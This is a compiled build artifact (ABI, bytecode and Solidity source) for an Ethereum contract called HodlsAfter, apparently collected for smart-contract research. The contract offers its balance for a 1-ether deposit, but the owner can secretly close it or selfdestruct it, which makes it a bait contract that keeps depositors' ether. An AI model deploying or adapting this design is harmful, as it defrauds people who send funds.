{
  "contractName": "HodlsAfter",
  "abi": [
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "assign",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "F",
          "type": "bool"
        }
      ],
      "name": "close",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "end",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "get",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405260008060146101000a81548160ff02191690831515021790555034801561002a57600080fd5b506102db8061003a6000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806312ae639714610064578063212c5fea1461006e5780636d4ce63c1461009d578063efbe1c1c146100a7575b005b61006c6100be565b005b34801561007a57600080fd5b5061009b600480360381019080803515159060200190929190505050610141565b005b6100a56101b4565b005b3480156100b357600080fd5b506100bc61023f565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166000141561013f57336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156101b15780600060146101000a81548160ff0219169083151502179055505b50565b670de0b6b3a764000034101580156101d95750600060149054906101000a900460ff16155b1561023d573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015801561023b573d6000803e3d6000fd5b505b565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156102ad573373ffffffffffffffffffffffffffffffffffffffff16ff5b5600a165627a7a723058203fda68c5f39449e81fda6d5596adf9e514222f9ef35d5729b37eaac639b9dd9e0029",
  "source": "\n\ncontract HodlsAfter {\n    function() public payable {}\n    address Owner; bool closed = false;\n    function assign() public payable { if (0==Owner) Owner=msg.sender; }\n    function close(bool F) public { if (msg.sender==Owner) closed=F; }\n    function end() public { if (msg.sender==Owner) selfdestruct(msg.sender); }\n    function get() public payable {\n        if (msg.value>=1 ether && !closed) {\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x0bf484a17015b8c999ddb64fa687e1f5e284120c/contracts/0x0bf484a17015b8c999ddb64fa687e1f5e284120c.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:46:03.214Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}